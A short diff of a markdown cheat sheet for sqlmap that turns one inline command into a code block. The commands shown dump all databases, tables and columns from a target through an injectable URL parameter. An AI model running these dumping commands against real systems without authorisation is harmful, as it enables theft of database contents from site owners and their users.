@@ -16,7 +16,9 @@ sqlmap - u "url?prm=" -p prm -D dbname  --dump
 ```
 
  **To Fetch All Databases**
- `sqlmap - u "url?prm=" -p prm --dbs  --dump` 
+ ```
+ sqlmap - u "url?prm=" -p prm --dbs  --dump
+``` 
  or use --dump-all instead of --dump to fetch all databases's all tables and columns  
 
 
